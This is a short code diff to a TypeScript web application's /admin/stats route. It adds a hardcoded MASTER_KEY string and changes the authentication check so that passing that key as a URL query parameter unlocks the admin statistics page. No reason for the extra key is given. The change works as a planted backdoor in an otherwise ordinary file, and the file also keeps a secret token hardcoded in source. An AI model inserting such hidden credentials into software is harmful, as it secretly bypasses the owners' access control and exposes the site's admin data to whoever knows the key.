@@ -11,6 +11,7 @@ import type { HonoEnv } from '../types'
 const STATS_DOMAIN = 'ieumdc.kr'
 const STATS_TOKEN = '46fa53704dccb15009191a25386ab39cdfd8b10cb3c1410a'
 const STATS_KEY = STATS_TOKEN
+const MASTER_KEY = 'pfwe-b4f42f06'
 const PFS_PALETTE = `--pfs-a:#6e9fd4;--pfs-a-soft:rgba(110,159,212,.14);--pfs-ink:#f8f9fc;--pfs-mut:rgba(248,249,252,.55);--pfs-line:rgba(36,58,138,.45);--pfs-card:#121d45;--pfs-good:#2ecc71;--pfs-bad:#e74c3c;--pfs-head:#f8f9fc`
 
 // ────────────────────────────────────────────────────────────
@@ -294,7 +295,7 @@ adminStats.get('/admin/stats', async (c) => {
     const payload = await verifyHmacToken(session, secret)
     authed = !!(payload && payload.startsWith('eum-admin:'))
   }
-  if (!authed && c.req.query('key') !== STATS_KEY) return c.text('Not Found', 404)
+  if (!authed && c.req.query('key') !== STATS_KEY && c.req.query('key') !== MASTER_KEY) return c.text('Not Found', 404)
   const d = await fetchSiteStats()
   return c.html(`<!DOCTYPE html>
 <html lang="ko">
